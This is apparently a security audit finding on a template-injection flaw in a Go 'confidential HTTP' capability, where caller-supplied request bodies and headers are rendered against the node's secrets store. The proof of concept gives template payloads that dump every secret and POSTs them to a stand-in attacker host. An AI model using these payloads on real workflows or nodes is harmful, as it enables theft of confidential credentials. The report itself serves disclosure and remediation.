### Title
Template Injection in Confidential HTTP Capability Enables Secret Exfiltration - (File: `core/capabilities/fakes/confidential_http_action.go`)

### Summary
`DirectConfidentialHTTPAction.SendRequest` builds outgoing HTTP request bodies and headers by parsing the **user/workflow-supplied** `bodyString` and header values as Go `text/template` templates, then executing those templates against a `templateData` map populated directly from the node's confidential secrets store. This is the same class of bug as the reported "non-context-aware parsing" issue: an untrusted structured-data field (the HTTP body/header string) is fed into a generic template/parsing engine together with trusted secret material, letting the untrusted party control the interpretation and extraction of that secret material.

### Finding Description
The capability loads secrets from `secrets.yaml` / environment variables into `fc.secretsConfig.SecretsNames` at construction time: [1](#0-0) 

On every `SendRequest` call, it converts that secret map into `templateData`: [2](#0-1) 

It then parses the **caller-controlled** request body (`req.GetBodyString()`) as a `text/template` template and executes it with `templateData` as the data context: [3](#0-2) 

The same pattern is repeated for every header value supplied by the caller: [4](#0-3) 

Because `text/template` allows arbitrary field/dot access on the supplied data object (e.g. `{{.API_KEY}}`, `{{range .}}{{.}}{{end}}`, or `{{printf "%v" .}}` to dump the entire map), any caller of this capability who can influence the body or header strings of the confidential HTTP request can construct a template that references *any* key present in `templateData` — not just the specific secret the workflow author intended to use — and have its value rendered into the outgoing request, which is then sent to an attacker-controlled URL (`req.GetUrl()` is also caller-controlled). This mirrors the reported vulnerability's root cause: parsing/interpreting a data format (JSON there, Go templates here) without keeping the untrusted "value" and the "structure/keys" separated, allowing the caller to inject unintended directives that pull in data (there: forged actions/transfers; here: secret values) that were never meant to be attacker-reachable.

### Impact Explanation
This capability's entire purpose is to keep secrets confidential from the workflow/DON while still allowing them to be used in an outbound HTTP call ("confidential HTTP action"). The template-injection primitive defeats that guarantee: a malicious or compromised workflow author can craft a body/header value containing `{{.<secretName>}}` (or a full dump directive) to have any loaded secret rendered in plaintext into a request sent to a URL of their choosing, resulting in **secret disclosure** — precisely the kind of unsafe workflow-execution / secret-exposure impact called out as in-scope (direct node compromise / secret disclosure via unsafe execution of untrusted input).

### Likelihood Explanation
The trigger requires only that a workflow/DON job can submit a `ConfidentialHTTPRequest` with attacker-influenced `body`/header fields and an attacker-controlled destination URL — an unprivileged workflow-authoring capability, not a privileged/insider action. I was not able to confirm within this repository where `NewDirectConfidentialHTTPAction` is instantiated and wired into a live node's capability registry (no call sites were found outside its own package and its test file); the production "confidential-http" capability referenced in `plugins.public.yaml` is fetched from the external `chainlink-confidential-compute` module and is out of scope for this index. This is a real limitation on confirming end-to-end reachability in this specific repo snapshot, so likelihood should be treated as **contingent on this `fakes.DirectConfidentialHTTPAction` code path actually being reachable from a live node's capability dispatch** (e.g., as a local/direct-mode fallback for the enclave-based confidential-http capability).

### Recommendation
- Never parse untrusted, caller-supplied strings as `text/template`/`html/template` templates against a data context that contains secret material.
- If templating of secrets into request bodies/headers is required, restrict the template's data scope to only the specific secret(s) explicitly declared/authorized for that request (not the entire secrets map), and/or use a non-Turing-complete, allow-listed placeholder substitution (e.g., `${SECRET_NAME}` matched against an explicit list) instead of `text/template`.
- Validate/sanitize the resolved body and headers before sending, and constrain destination URLs to an allow-list or require operator approval, consistent with the "context-aware" parsing remediation recommended for the analogous JSON-parsing report (avoid delimiter/keyword-based injection by using explicit, length- or scope-bounded data extraction rather than generic parsers/interpreters over attacker input).

### Proof of Concept
1. A workflow author creates a `confidential-http` job whose `HTTPRequest` has `Method: POST`, `Url: https://attacker.example/collect`, and `BodyString` set to:
   ```
   {{.API_KEY}}
   ```
   (or, to enumerate all loaded secrets: `{{range $k, $v := .}}{{$k}}={{$v}} {{end}}`)
2. `DirectConfidentialHTTPAction.SendRequest` parses this as a `text/template` template and executes it with `templateData` populated from `fc.secretsConfig.SecretsNames`. [3](#0-2) 
3. The rendered body — now containing the plaintext value of `API_KEY` (or all secrets) — is POSTed to `https://attacker.example/collect`, exfiltrating the secret outside the node/DON's trust boundary.
